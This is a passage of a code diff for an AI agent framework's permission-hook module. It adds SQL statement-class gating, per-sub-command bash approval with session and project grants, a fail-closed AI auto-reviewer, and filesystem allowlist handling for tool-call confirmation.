@@ -17,25 +17,41 @@ when prompting users for permission confirmation.
 
 import asyncio
 import json
-import logging
 import re
 import weakref
 from dataclasses import dataclass
 from pathlib import Path
-from typing import TYPE_CHECKING, Any, List, Optional, Set, Tuple
+from typing import TYPE_CHECKING, Any, Callable, Dict, List, Optional, Set, Tuple
 
 from agents.lifecycle import AgentHooks
 
 from datus.cli.execution_state import InteractionBroker, InteractionCancelled
 from datus.schemas.interaction_event import InteractionEvent
-from datus.tools.func_tool.fs_path_policy import PathZone, classify_path
-from datus.tools.permission.permission_config import PermissionLevel
+from datus.tools.func_tool.fs_path_policy import PathAllowlist, PathZone, classify_path
+from datus.tools.permission import review_registry
+from datus.tools.permission.bash_classifier import BashClassifierContext
+from datus.tools.permission.bash_rules import (
+    BashDecisionSource,
+    BashRuleDecision,
+    BashSegmentDecision,
+    evaluate_bash_command,
+)
+from datus.tools.permission.permission_config import PermissionLevel, classify_sql_kind
 from datus.tools.registry.tool_registry import ToolRegistry
+from datus.utils.constants import SQLType
+from datus.utils.json_utils import to_pretty_str
+from datus.utils.loggings import get_logger
 
 if TYPE_CHECKING:
+    from datus.tools.permission.auto_reviewer import AutoReviewer, AutoReviewVerdict
+    from datus.tools.permission.bash_classifier import BashCommandClassifier
     from datus.tools.permission.permission_manager import PermissionManager
 
-logger = logging.getLogger(__name__)
+logger = get_logger(__name__)
+
+# ``permissions.bash_commands.classifier`` is consulted on every bash ASK, so
+# the migration hint is emitted once per process instead of once per command.
+_LEGACY_CLASSIFIER_DEPRECATION_LOGGED = False
 
 # Per-broker locks to serialize permission prompts within a single agent run.
 #
@@ -93,6 +109,70 @@ def _get_permission_prompt_lock(broker: Any = None) -> asyncio.Lock:
     return lock
 
 
+# Scalar strings at or below this length (and free of newlines) render inline on
+# the key line; anything longer moves into a fenced code block so the TUI's
+# syntax highlighting + scroll/pager handle it instead of cramming it onto one
+# line. Nothing is truncated — the InteractionApp already pages long content
+# (Shift+Up/Down) and opens it in a pager (``v``).
+_INLINE_ARG_MAX = 80
+
+# A bash confirmation choice names the buckets/patterns it grants, up to this
+# many; beyond that the label degrades to a count. The full per-sub-command
+# breakdown always lives in the prompt body, which the TUI pages rather than
+# truncates, so a long chain never hides what is being approved.
+_MAX_LABELLED_SEGMENTS = 3
+
+
+def _inline_code(text: str) -> str:
+    """Wrap ``text`` in a markdown code span that survives backticks inside it.
+
+    Bash commands routinely contain backticks (``echo `whoami```), which would
+    otherwise close the span early and mangle the permission prompt. CommonMark
+    lets a span use N backticks to hold a run of N-1, plus one space of padding
+    when the content itself starts or ends with a backtick.
+    """
+    longest = max((len(run) for run in re.findall(r"`+", text)), default=0)
+    fence = "`" * (longest + 1)
+    pad = " " if text.startswith("`") or text.endswith("`") else ""
+    return f"{fence}{pad}{text}{pad}{fence}"
+
+
+def _format_tool_args_markdown(args: dict) -> str:
+    """Render tool arguments as a readable markdown key/value block.
+
+    Replaces the old single-line ``json.dumps`` + hard 200-char truncation,
+    which mangled nested structures and cut SQL mid-statement. Rendering rules:
+
+    * Scalars (short strings, ints, floats, bools, ``None``) render inline as
+      ``**key:** `value` ``.
+    * The ``sql`` argument and any multi-line / long string render in a fenced
+      code block — ``sql`` for the SQL argument (so it is highlighted),
+      language-less otherwise.
+    * ``dict`` / ``list`` values render as pretty (2-space) JSON in a ```json
+      block.
+
+    Each argument is emitted as its own top-level paragraph / code block rather
+    than nested under a list item, so ``RichMarkdown`` renders the fenced blocks
+    unambiguously. Nothing is truncated.
+
+    Returns an empty string for empty ``args`` so callers can skip the section.
+    """
+    if not args:
+        return ""
+
+    parts: List[str] = ["", "**Arguments**", ""]
+    for key, value in args.items():
+        if isinstance(value, (dict, list)):
+            pretty = to_pretty_str(value) or "{}"
+            parts.extend([f"**{key}:**", "", "```json", pretty, "```", ""])
+        elif isinstance(value, str) and ("\n" in value or len(value) > _INLINE_ARG_MAX):
+            lang = "sql" if key == "sql" else ""
+            parts.extend([f"**{key}:**", "", f"```{lang}", value, "```", ""])
+        else:
+            parts.append(f"**{key}:** `{value}`")
+    return "\n".join(parts)
+
+
 class PermissionDeniedException(Exception):
     """Exception raised when a tool call is denied by permission rules."""
 
@@ -133,6 +213,12 @@ class FilesystemPolicy:
     # without prompting. Stays ``None`` outside of agentic sessions (e.g. SaaS
     # request-scoped tools) — those paths then remain EXTERNAL.
     session_data_dir: Optional[Path] = None
+    # Operator-configured roots outside the project root (``agent.filesystem
+    # .allow_read`` / ``allow_write``). Must mirror what the tool was built
+    # with, otherwise the hook would prompt (or fail) on a path the tool is
+    # perfectly willing to write.
+    allowlist: Optional[PathAllowlist] = None
+    allowlist_provider: Optional[Callable[[], Optional[PathAllowlist]]] = None
 
 
 class CompositeHooks(AgentHooks):
@@ -140,7 +226,7 @@ class CompositeHooks(AgentHooks):
 
     This class allows multiple hooks to be applied in sequence,
     enabling composition of permission hooks with other hooks
-    (e.g., GenerationHooks).
+    (e.g., ValidationHook).
     """
 
     def __init__(self, hooks_list: List[Optional[AgentHooks]]):
@@ -213,6 +299,11 @@ class PermissionHooks(AgentHooks):
         fs_policy: Optional[FilesystemPolicy] = None,
         non_interactive: bool = False,
         proxied_tool_names: Optional[Set[str]] = None,
+        project_root: Optional[str] = None,
+        config_mutable: bool = True,
+        bash_classifier: Optional["BashCommandClassifier"] = None,
+        auto_reviewer: Optional["AutoReviewer"] = None,
+        review_context_provider: Optional[Callable[[], Dict[str, Any]]] = None,
     ):
         """Initialize the permission hooks.
 
@@ -238,12 +329,34 @@ class PermissionHooks(AgentHooks):
             proxied_tool_names: Optional set of tool names that
                 :func:`datus.tools.proxy.proxy_tool.apply_proxy_tools` wrapped
                 with stdin-driven proxies. When provided, ``on_tool_start``
-                skips ALL permission checks (DENY/ASK/zone) for these tools —
-                the external caller (e.g. ``print_mode`` stdin protocol) owns
-                secondary confirmation, so the agent must not double-prompt or
-                block proxied calls. Passing the same set reference held by the
-                node lets late ``apply_proxy_tools`` invocations be observed
-                without rebuilding the hook.
+                skips permission checks for externally executed proxies — the
+                external caller (e.g. ``print_mode`` stdin protocol) owns
+                secondary confirmation. Server-side semantic plan writers
+                still enforce permission rules before their preview review.
+                Passing the same set reference held by the node lets late
+                ``apply_proxy_tools`` invocations be observed without rebuilding
+                the hook.
+            project_root: Workspace root used to resolve a ``.sql`` file
+                reference passed to ``execute_sql``. The SQL permission gate
+                reads the file (same logic as the tool) so a read-only ``.sql``
+                file auto-allows instead of prompting. ``None`` falls back to the
+                current working directory. Also used as the write target for
+                project-level bash allow grants (``.datus/config.yml``).
+            config_mutable: Whether project configuration may be persisted.
+                When ``False`` (for example, the multi-tenant API), permission
+                prompts omit the project-level choice while retaining once and
+                session approvals. Existing project grants supplied through
+                ``AgentConfig`` still apply.
+            bash_classifier: Optional LLM classifier for bash commands (reserved
+                seam, see ``bash_classifier.py``). Consulted only when the
+                static bash rules yield ASK with ``safety_forced=False``; a
+                high-confidence ALLOW verdict auto-approves, anything else
+                falls through to the normal confirmation prompt (fail closed).
+            auto_reviewer: Shared, structured reviewer for bash/SQL actions
+                that remain ASK after static rules and explicit grants.
+            review_context_provider: Optional callback supplying bounded user
+                messages, prior planned bash/SQL arguments, and environment
+                metadata. Assistant prose and tool outputs must be excluded.
         """
         self.broker = broker
         self.permission_manager = permission_manager
@@ -252,6 +365,129 @@ class PermissionHooks(AgentHooks):
         self.fs_policy = fs_policy
         self.non_interactive = non_interactive
         self.proxied_tool_names = proxied_tool_names
+        self.project_root = project_root
+        self.config_mutable = bool(config_mutable)
+        self.bash_classifier = bash_classifier
+        self.auto_reviewer = auto_reviewer
+        self.review_context_provider = review_context_provider
+
+    def _auto_review_config(self, action_type: str, effective: Any, bash_rules: Any = None) -> Any:
+        """Resolve the current profile's reviewer config plus legacy bash overrides."""
+        from datus.tools.permission.permission_config import AutoReviewConfig
+
+        config = getattr(effective, "auto_review", None) or AutoReviewConfig()
+        if action_type != "bash" or bash_rules is None or "classifier" not in bash_rules.model_fields_set:
+            return config
+
+        # ``bash_commands.classifier`` was published as a reserved seam before
+        # the shared reviewer existed. Keep it as a deprecated bash-only
+        # override so existing configurations start working rather than break.
+        global _LEGACY_CLASSIFIER_DEPRECATION_LOGGED
+        if not _LEGACY_CLASSIFIER_DEPRECATION_LOGGED:
+            _LEGACY_CLASSIFIER_DEPRECATION_LOGGED = True
+            logger.warning(
+                "permissions.bash_commands.classifier is deprecated and applies to bash only; "
+                "migrate these settings to permissions.auto_review"
+            )
+        legacy = bash_rules.classifier
+        values = config.model_dump()
+        for field_name in legacy.model_fields_set:
+            if field_name in {"enabled", "model", "confidence_threshold"}:
+                values[field_name] = getattr(legacy, field_name)
+        return AutoReviewConfig(**values)
+
+    def _review_evidence(self) -> Dict[str, Any]:
+        if self.review_context_provider is None:
+            return {}
+        try:
+            evidence = self.review_context_provider()
+            return evidence if isinstance(evidence, dict) else {}
+        except Exception as exc:
+            logger.warning("Failed to collect auto-review context; continuing with planned action only: %s", exc)
+            return {}
+
+    async def _review_ask_action(
+        self,
+        *,
+        context: Any,
+        action_type: str,
+        action: Dict[str, Any],
+        static_assessment: Dict[str, Any],
+        effective: Any,
+        bash_rules: Any = None,
+    ) -> Tuple[Optional["AutoReviewVerdict"], Any]:
+        """Run one review when enabled; callers apply the fail-closed fallback."""
+        config = self._auto_review_config(action_type, effective, bash_rules)
+        if not config.enabled or self.auto_reviewer is None:
+            return None, config
+
+        from datus.tools.permission.auto_reviewer import AutoReviewRequest
+
+        evidence = self._review_evidence()
+        # Node-supplied keys are merged FIRST: the hook owns the security
+        # posture the reviewer must reason about, so a ``review_context_provider``
+        # must never be able to relabel the profile, interactivity, or paths.
+        provided_environment = evidence.get("environment")
+        environment = {
+            **(provided_environment if isinstance(provided_environment, dict) else {}),
+            "cwd": self.project_root or ".",
+            "project_root": self.project_root or ".",
+            "node_name": self.node_name,
+            "profile": getattr(self.permission_manager, "active_profile", None) or "unknown",
+            "non_interactive": self.non_interactive,
+        }
+        request = AutoReviewRequest(
+            action_type=action_type,
+            action=action,
+            environment=environment,
+            static_assessment=static_assessment,
+            trusted_user_messages=evidence.get("trusted_user_messages", []),
+            prior_actions=evidence.get("prior_actions", []),
+            direct_user_invocation=bool(getattr(context, "direct_user_invocation", False)),
+        )
+        return await self.auto_reviewer.review(request, config), config
+
+    @staticmethod
+    def _review_denial_detail(verdict: Optional["AutoReviewVerdict"], *, enabled: bool) -> str:
+        if not enabled:
+            return ""
+        if verdict is None:
+            return "AI review was unavailable or inconclusive"
+        return (
+            f"AI review classified the action as {verdict.risk_level.value} risk "
+            f"with {verdict.user_authorization.value} user authorization: {verdict.rationale}"
+        )
+
+    @staticmethod
+    def _record_review(
+        context: Any,
+        verdict: Optional["AutoReviewVerdict"],
+        config: Any,
+        outcome: str,
+    ) -> None:
+        """Publish a review outcome for the tool action this call will produce.
+
+        Keyed by the SDK's ``tool_call_id`` so whoever builds the completed
+        ``ActionHistory`` for the same call can stamp it into ``output`` (see
+        ``review_registry``). Silent when review is disabled — the CLI must not
+        claim a review happened when none did.
+        """
+        if not getattr(config, "enabled", False):
+            return
+        payload: Dict[str, Any] = {"outcome": outcome}
+        if verdict is None:
+            # No rationale to report — the renderer's "unavailable" marker says
+            # it once; a canned sentence here would just repeat it on the row.
+            payload["decision"] = "unavailable"
+        else:
+            payload.update(
+                decision=verdict.decision.value,
+                risk_level=verdict.risk_level.value,
+                user_authorization=verdict.user_authorization.value,
+                confidence=verdict.confidence,
+                rationale=verdict.rationale,
+            )
+        review_registry.record(getattr(context, "tool_call_id", None), payload)
 
     # Plan-mode tooling is always allowed regardless of permission profile:
     # ``confirm_plan`` already runs its own user interaction, and ``todo_*``
@@ -283,11 +519,14 @@ class PermissionHooks(AgentHooks):
         if tool_name in self._PLAN_MODE_BYPASS_TOOLS:
             return
 
-        # Short-circuit proxied tools: their execution is delegated to the
-        # external caller via the stdin proxy channel, which owns secondary
-        # confirmation. Re-checking the profile here would either double-prompt
-        # (ASK) or block calls the caller already authorised (DENY).
-        if self.proxied_tool_names and tool_name in self.proxied_tool_names:
+        # External proxies own their permission handling. Semantic plans are
+        # written server-side: their separate preview approval must not bypass
+        # custom ASK/DENY rules.
+        if (
+            self.proxied_tool_names
+            and tool_name in self.proxied_tool_names
+            and tool_name != "write_semantic_model_plan_file"
+        ):
             logger.debug("Tool '%s' is proxied; skipping permission check", tool_name)
             return
 
@@ -302,6 +541,32 @@ class PermissionHooks(AgentHooks):
         #   /Users/foo/secret does not cascade to /Users/foo/other.
         if self.fs_policy is not None and category == "filesystem_tools":
             handled = await self._handle_filesystem_zone(context, tool_name, pattern_name)
+            if handled:
+                return
+
+        # db_tools.execute_sql: statement-class gating overrides rules.
+        #   The statement is classified into a fine-grained kind (insert/
+        #   create/drop/...) whose class (read/write/destructive/unknown) is
+        #   resolved against the profile's ``sql_statements`` ruleset: read
+        #   auto-allows everywhere, write auto-allows under auto, destructive
+        #   and unknown ASK (session cache bucketed per kind, project grants
+        #   via ``.datus/config.yml`` sql_allow), dangerous bypass,
+        #   non-interactive raise. A ``.sql`` file is resolved first; an
+        #   unreadable file or unparseable text falls to unknown → ASK.
+        if category == "db_tools" and tool_name == "execute_sql":
+            handled = await self._handle_sql_permission(context, tool_name, pattern_name)
+            if handled:
+                return
+
+        # bash_tools.bash: command-level gating overrides the coarse rule.
+        #   deny patterns → raise; allow patterns / profile whitelist → bypass;
+        #   everything else → ASK with a per-command-prefix session bucket and
+        #   an optional project-level persist ("allow (project)"). Shell
+        #   wrappers / metacharacters force ASK regardless of allow rules.
+        #   Ruleset absent (e.g. dangerous profile) → fall through to the
+        #   legacy coarse ``bash_tools.bash`` rule check below.
+        if category == "bash_tools" and tool_name == "bash":
+            handled = await self._handle_bash_permission(context, tool_name, pattern_name)
             if handled:
                 return
 
@@ -389,7 +654,17 @@ class PermissionHooks(AgentHooks):
     # this set so the profile-aware gate treats it as a write. ``delete_file``
     # belongs here too — it mutates the filesystem just as much as a write
     # and should hit the same INTERNAL × write × normal ASK gate.
-    _FILESYSTEM_WRITE_TOOLS = frozenset({"write_file", "edit_file", "delete_file"})
+    _FILESYSTEM_WRITE_TOOLS = frozenset(
+        {
+            "write_file",
+            "edit_file",
+            "delete_file",
+            "upsert_osi_metrics",
+            "delete_osi_metrics",
+            "upsert_osi_datasets",
+            "delete_osi_datasets",
+        }
+    )
 
     # Subagents that author their own artifact tree (manifest.json,
     # queries/*, render/*.jsx, analysis/*) in one turn — usually 5-10 files
@@ -428,7 +703,7 @@ class PermissionHooks(AgentHooks):
         read          EXTERNAL (interactive)    ASK(path bucket) ASK(path bucket) bypass
         read          EXTERNAL (strict)         tool fail       tool fail       tool fail
         read          EXTERNAL (non-interactive) raise          raise           raise
-        write         INTERNAL                  rule lookup ASK bypass          bypass
+        write         INTERNAL                  rule lookup ASK bypass*         bypass
         write         WHITELIST (parent memory) tool reject     tool reject     tool reject
         write         HIDDEN                    tool not-found  tool not-found  tool not-found
         write         EXTERNAL (interactive)    ASK(path bucket) ASK(path bucket) bypass
@@ -441,6 +716,8 @@ class PermissionHooks(AgentHooks):
         * ``non_interactive`` short-circuits ``dangerous`` — workflow flows must
           never silently write outside the project just because they happen to
           run under the dangerous profile.
+        * OSI object deletes are the narrow exceptions to AUTO's INTERNAL write
+          bypass: normal and auto both defer them to explicit ASK rules.
         * ``policy.strict`` short-circuits everything for EXTERNAL paths;
           callers without an interactive broker rely on the tool-layer fail.
         * WHITELIST writes are left to ``FilesystemFuncTool._read_only_reject``
@@ -468,6 +745,7 @@ class PermissionHooks(AgentHooks):
                 current_node=policy.current_node,
                 datus_home=policy.datus_home,
                 session_data_dir=policy.session_data_dir,
+                allowlist=policy.allowlist_provider() if policy.allowlist_provider else policy.allowlist,
             )
         except Exception as e:
             logger.debug(f"classify_path failed for {tool_name} path={path_arg!r}: {e}")
@@ -477,6 +755,17 @@ class PermissionHooks(AgentHooks):
         profile = getattr(self.permission_manager, "active_profile", None) or "normal"
 
         if resolved.zone in (PathZone.INTERNAL, PathZone.WHITELIST):
+            if (
+                tool_name in {"delete_osi_metrics", "delete_osi_datasets"}
+                and profile in {"normal", "auto"}
+                and resolved.zone == PathZone.INTERNAL
+            ):
+                logger.debug(
+                    "Filesystem zone INTERNAL × OSI object delete × %s: deferring to rule lookup for %s",
+                    profile,
+                    resolved.display,
+                )
+                return False
             # INTERNAL × write × normal: fall through to rule lookup so the
             # category-level ``default=ASK`` (or any explicit ``filesystem_tools.write_file``
             # rule) takes over. ``_NORMAL_RULES`` has no entry for write_file,
@@ -628,6 +917,737 @@ class PermissionHooks(AgentHooks):
             logger.error(f"Error in external filesystem confirmation for {tool_name}: {e}")
             return False
 
+    # Read-only statement kinds that auto-allow under ``execute_sql``
+    # regardless of profile (legacy path — the class-rule path resolves the
+    # same set through ``classify_sql_kind``'s ``read`` class).
+    _SQL_READONLY_KINDS = frozenset({SQLType.SELECT.value, SQLType.METADATA_SHOW.value, SQLType.EXPLAIN.value})
+
+    # Fine-grained kinds folded back into their legacy ``SQLType`` value for
+    # the no-ruleset path, so session buckets stay byte-compatible with
+    # configs that predate ``sql_statements`` (e.g. ``execute_sql.ddl``, not
+    # ``execute_sql.drop``).
+    _SQL_LEGACY_KIND_MAP = {
+        "create": SQLType.DDL.value,
+        "alter": SQLType.DDL.value,
+        "drop": SQLType.DDL.value,
+        "truncate": SQLType.DDL.value,
+        "replace": SQLType.INSERT.value,
+    }
+
+    async def _handle_sql_permission(self, context: Any, tool_name: str, pattern_name: str) -> bool:
+        """Statement-class gating for ``db_tools.execute_sql`` calls.
+
+        ``execute_sql`` is the unified SQL entry point, so a single static rule
+        cannot express "reads auto-allow, writes ask, destructive statements
+        always confirm". This gate classifies the statement into a fine-grained
+        kind (``parse_sql_statement_kind``: ``insert`` / ``create`` / ``drop``
+        / ...) and gates on the kind's class (:func:`classify_sql_kind`:
+        read / write / destructive / unknown) via the effective config's
+        ``sql_statements`` ruleset:
+
+        * Coarse category rules stay authoritative: an explicit DENY defers so
+          the main flow raises the standardized message; an explicit ALLOW
+          (dangerous profile default, or a user ``db_tools/execute_sql: allow``
+          rule) bypasses everything.
+        * No ``sql_statements`` ruleset (legacy configs, bare
+          ``PermissionConfig``) → original behavior: read-only statements
+          auto-allow, everything else prompts with a per-SQLType session
+          bucket.
+        * Ruleset present → the class level decides. ALLOW passes (this is how
+          ``auto`` runs INSERT/CREATE without prompting), DENY raises in-hook,
+          ASK consults the project grant set (``.datus/config.yml``
+          ``sql_allow``), then the per-kind session cache, then prompts with
+          allow once / session / project / deny. Session and project grants
+          are keyed by the concrete kind (``execute_sql.drop`` vs
+          ``.truncate``) so one approval never cascades across kinds.
+
+        A ``.sql`` file reference is resolved (same workspace-relative read as
+        the tool) so the gate classifies the real statement — a read-only
+        ``.sql`` file auto-allows instead of prompting. An unreadable file or
+        unparseable text falls to kind ``unknown`` → ASK (fail safe). Only the
+        first statement is classified; the tool layer's multi-statement
+        rejection (``_validate_read_sql`` and the write/DDL validators) is the
+        backstop for trailing statements.
+
+        Returns ``True`` when the call has been fully handled, ``False`` to
+        let the normal category-level permission check run (surfaces DENY /
+        the standardized non-interactive raise).
+        """
+        from datus.utils.sql_utils import looks_like_sql_file_ref, parse_sql_statement_kind, read_workspace_sql_file
+
+        raw_args = getattr(context, "tool_arguments", "{}")
+        if isinstance(raw_args, str):
+            try:
+                json.loads(raw_args)
+            except (json.JSONDecodeError, TypeError):
+                # DBFuncTool.execute_sql is always wrapped by
+                # trans_to_function_tool, whose malformed-JSON path repairs
+                # the history and returns a retry error without executing SQL.
+                # Let that no-execute path run instead of classifying an empty
+                # fallback as UNKNOWN and prompting (or denying workflows).
+                # The model's valid retry comes through this gate again and is
+                # classified from the actual SQL before it can execute.
+                logger.debug("Deferring malformed execute_sql arguments to tool recovery")
+                return True
+
+        args = self._parse_tool_args(context)
+        if not isinstance(args, dict):
+            return False
+        sql = args.get("sql", "")
+        # Resolve a ``.sql`` file reference to its real (single) statement so the
+        # kind detection below sees the SQL, not the path. On any read failure,
+        # leave ``sql`` as-is → unknown → ASK (fail safe).
+        if isinstance(sql, str) and looks_like_sql_file_ref(sql):
+            try:
+                sql = read_workspace_sql_file(sql.strip(), self.project_root or ".")
+            except Exception as e:
+                logger.debug("execute_sql gate: could not resolve .sql file (%s); treating as UNKNOWN", e)
+        # No dialect available at the hook layer; the keyword fallback in
+        # ``parse_sql_statement_kind`` is enough to separate the classes.
+        kind = parse_sql_statement_kind(sql, "") if isinstance(sql, str) else SQLType.UNKNOWN.value
+        sql_class = classify_sql_kind(kind)
+
+        # Honour explicit coarse rules first — they are the escape hatches.
+        permission = self.permission_manager.check_permission("db_tools", pattern_name, self.node_name)
+        if permission == PermissionLevel.DENY:
+            # Surface the standardized DENY raise via the main flow.
+            return False
+        if permission == PermissionLevel.ALLOW:
+            # Explicit ALLOW rule or a permissive profile (e.g. dangerous).
+            return True
+
+        rules = getattr(self.permission_manager.get_effective_config(self.node_name), "sql_statements", None)
+        if rules is None:
+            # Legacy path (no per-class ruleset): reads auto-allow, everything
+            # else prompts with the coarse SQLType bucket.
+            return await self._handle_sql_permission_legacy(context, kind)
+
+        level = rules.level_for_class(sql_class)
+        if level == PermissionLevel.ALLOW:
+            logger.debug("execute_sql %s (class %s): auto-allow by sql_statements", kind, sql_class)
+            return True
+        if level == PermissionLevel.DENY:
+            profile = getattr(self.permission_manager, "active_profile", None) or "unknown"
+            logger.warning("execute_sql %s (class %s) denied by sql_statements rules", kind, sql_class)
+            raise PermissionDeniedException(
+                (
+                    f"PERMISSION_DENIED: SQL statement kind '{kind}' (class '{sql_class}') is "
+                    f"blocked by the '{profile}' permission profile's sql_statements rules. "
+                    f"STOP retrying — rewording the SQL will not change the outcome. Return "
+                    f"the failure to your caller. The user can adjust "
+                    f"`permissions.sql_statements` in agent.yml."
+                ),
+                tool_category="db_tools",
+                tool_name="execute_sql",
+            )
+
+        # ASK. A project-scope grant (``.datus/config.yml`` sql_allow or an
+        # "allow (project)" prompt choice earlier this session) covering this
+        # exact kind bypasses the confirmation.
+        if self.permission_manager.has_project_sql_grant(kind):
+            logger.debug("execute_sql %s bypassed by project grant", kind)
+            return True
+
+        # Bucket the session approval by the concrete kind so an "always
+        # allow" only ever covers that one kind (e.g. approving a DROP never
+        # green-lights a later TRUNCATE). Broad keys still honor a deliberate
+        # wide approval (a prior un-bucketed ``db_tools.execute_sql`` or a
+        # category wildcard).
+        cache_keys = (f"db_tools.execute_sql.{kind}", "db_tools.execute_sql", "db_tools.*")
+
+        def _session_approved() -> bool:
+            return any(self.permission_manager._session_approvals.get(key) for key in cache_keys)
+
+        if _session_approved():
+            logger.debug("execute_sql %s already approved for session", kind)
+            return True
+
+        # Only actions that still need approval reach the reviewer. Explicit
+        # project/session grants are checked first because they are stronger
+        # authorization evidence and should not incur another model call.
+        verdict, review_config = await self._review_ask_action(
+            context=context,
+            action_type="sql",
+            action={
+                "sql": sql,
+                "datasource": args.get("datasource", ""),
+                "database": args.get("database", ""),
+                "min_rows": args.get("min_rows"),
+                "max_rows": args.get("max_rows"),
+                "statement_kind": kind,
+                "statement_class": sql_class,
+            },
+            static_assessment={"level": "ask", "statement_kind": kind, "statement_class": sql_class},
+            effective=self.permission_manager.get_effective_config(self.node_name),
+        )
+        if verdict is not None and verdict.can_auto_allow(review_config):
+            logger.info(
+                "execute_sql %s auto-allowed by AI reviewer (risk=%s confidence=%.2f)",
+                kind,
+                verdict.risk_level.value,
+                verdict.confidence,
+            )
+            self._record_review(context, verdict, review_config, "auto_allowed")
+            return True
+
+        if self.non_interactive:
+            profile = getattr(self.permission_manager, "active_profile", None) or "auto"
+            detail = self._review_denial_detail(verdict, enabled=review_config.enabled)
+            review_suffix = f" {detail}." if detail else ""
+            raise PermissionDeniedException(
+                (
+                    f"PERMISSION_DENIED: SQL statement kind '{kind}' requires confirmation under "
+                    f"the '{profile}' profile, but this flow is non-interactive.{review_suffix} "
+                    "STOP retrying — surface the failure to the caller."
+                ),
+                tool_category="db_tools",
+                tool_name="execute_sql",
+            )
+
+        async with _get_permission_prompt_lock(self.broker):
+            if _session_approved():
+                return True
+            # The project choice is offered for every concrete kind — the user
+            # opted into project-scope grants for destructive statements too —
+            # but never for ``unknown``: persisting a grant that auto-allows
+            # every future unparseable statement would be a blank cheque.
+            offer_project = self.config_mutable and kind != SQLType.UNKNOWN.value
+            choice = await self._request_sql_confirmation(
+                sql,
+                kind,
+                sql_class,
+                offer_project=offer_project,
+                review_verdict=verdict,
+                review_enabled=review_config.enabled,
+            )
+            if choice in ("y", "a") or (choice == "p" and offer_project):
+                self._record_review(context, verdict, review_config, "user_approved")
+            if choice == "y":
+                logger.info("User approved execute_sql (%s, once)", kind)
+                return True
+            if choice == "a":
+                self.permission_manager.approve_for_session("db_tools", f"execute_sql.{kind}")
+                logger.info("User approved execute_sql kind %r for session", kind)
+                return True
+            if choice == "p" and offer_project:
+                persisted = self.permission_manager.add_project_sql_allow(kind, self.project_root)
+                # Session cache too, so later same-kind calls this session skip
+                # the prompt without re-consulting the grant set.
+                self.permission_manager.approve_for_session("db_tools", f"execute_sql.{kind}")
+                logger.info(
+                    "User granted project-level sql allow %r%s",
+                    kind,
+                    "" if persisted else " (disk write failed; session-only)",
+                )
+                return True
+            logger.info("User rejected execute_sql (%s)", kind)
+            raise PermissionDeniedException(
+                "User rejected execution of 'execute_sql'",
+                tool_category="db_tools",
+                tool_name="execute_sql",
+            )
+
+    async def _handle_sql_permission_legacy(self, context: Any, kind: str) -> bool:
+        """Pre-``sql_statements`` gating, kept for configs without a ruleset.
+
+        Reads auto-allow; everything else prompts via the generic
+        ``_request_user_confirmation`` (allow once / session / deny — no
+        project choice) with the session approval bucketed by the coarse
+        ``SQLType`` value, exactly as before the per-class ruleset existed.
+        The caller has already resolved coarse DENY/ALLOW rules.
+        """
+        if kind in self._SQL_READONLY_KINDS:
+            logger.debug("execute_sql read-only (%s): auto-allow", kind)
+            return True
+
+        if self.non_interactive:
+            return False
+
+        sql_class = self._SQL_LEGACY_KIND_MAP.get(kind, kind)
+        bucket_pattern = f"execute_sql.{sql_class}"
+        cache_keys = (f"db_tools.{bucket_pattern}", "db_tools.execute_sql", "db_tools.*")
+
+        def _session_approved() -> bool:
+            return any(self.permission_manager._session_approvals.get(key) for key in cache_keys)
+
+        if _session_approved():
+            logger.debug("execute_sql %s already approved for session", sql_class)
+            return True
+
+        async with _get_permission_prompt_lock(self.broker):
+            if _session_approved():
+                return True
+            # Pass the bucketed pattern as the cache key; deliberately omit
+            # ``tool_name`` so "Always allow" caches ONLY ``db_tools.execute_sql.<type>``
+            # and not the un-bucketed ``db_tools.execute_sql`` (which would cascade
+            # across statement types).
+            approved = await self._request_user_confirmation("db_tools", bucket_pattern, context)
+            if not approved:
+                logger.info("User rejected execute_sql (%s)", sql_class)
+                raise PermissionDeniedException(
+                    "User rejected execution of 'execute_sql'",
+                    tool_category="db_tools",
+                    tool_name="execute_sql",
+                )
+            logger.info("User approved execute_sql (%s)", sql_class)
+            return True
+
+    async def _request_sql_confirmation(
+        self,
+        sql: str,
+        kind: str,
+        sql_class: str,
+        *,
+        offer_project: bool,
+        review_verdict: Optional["AutoReviewVerdict"] = None,
+        review_enabled: bool = False,
+    ) -> str:
+        """Prompt for a SQL statement; returns the raw choice key ('' on cancel).
+
+        Mirrors ``_request_bash_confirmation``: callers need the concrete
+        choice to distinguish session from project grants.
+        """
+        profile = getattr(self.permission_manager, "active_profile", None) or "unknown"
+        sql_text = sql if isinstance(sql, str) else str(sql)
+        content = (
+            f"### SQL Statement Permission\n\n"
+            f"```sql\n{sql_text}\n```\n\n"
+            f"**Statement:** `{kind}` (class: {sql_class})\n"
+            f"**Reason:** '{sql_class}' statements require confirmation under the '{profile}' profile\n"
+        )
+        if review_verdict is not None:
+            content += (
+                f"**AI review:** `{review_verdict.risk_level.value}` risk, "
+                f"`{review_verdict.user_authorization.value}` authorization — "
+                f"{review_verdict.rationale}\n"
+            )
+        elif review_enabled:
+            content += "**AI review:** unavailable or inconclusive — manual confirmation required\n"
+        choices = {
+            "y": "Allow (once)",
+            "a": f"Allow '{kind}' (session)",
+        }
+        if offer_project:
+            choices["p"] = f"Allow '{kind}' (project)"
+        choices["n"] = "Deny"
+
+        try:
+            answers = await self.broker.request(
+                [
+                    InteractionEvent(
+                        title="SQL Permission",
+                        content=content,
+                        choices=choices,
+                        default_choice="n",
+                    )
+                ]
+            )
+            return answers[0][0] if answers and answers[0] else ""
+        except InteractionCancelled:
+            return ""
+        except Exception as e:
+            logger.error(f"Error in SQL permission confirmation: {e}")
+            return ""
+
+    async def _handle_bash_permission(self, context: Any, tool_name: str, pattern_name: str) -> bool:
+        """Command-level gating for ``bash_tools.bash`` calls.
+
+        The coarse ``bash_tools.bash -> ASK`` rule cannot express "``git log``
+        is fine, ``rm`` never is". This gate evaluates the ``command`` argument
+        against the effective ``bash_commands`` ruleset (profile whitelist +
+        user agent.yml rules + project ``.datus/config.yml`` allows — see
+        ``bash_rules.evaluate_bash_command`` for the deny-first decision order).
+
+        Chained commands (``a | b``, ``a && b``, ``a; b``, ``a || b``) are
+        judged per sub-command by ``evaluate_bash_command``; ``decision.
+        ask_segments`` carries EVERY sub-command that needs approval, and the
+        prompt, the session cache and the project grants all operate on that
+        whole set rather than on one representative.
+
+        * DENY match → raise immediately, naming the matched pattern.
+        * ALLOW match → bypass (no prompt).
+        * ASK → bypasses when every sub-command is an ask-rule hit whose
+          matched pattern carries an exact project grant
+          (``.datus/config.yml`` ``bash_allow``); otherwise the session cache
+          is checked (every sub-command must be covered), then the shared AI
+          reviewer may auto-allow a confident low/medium-risk verdict.
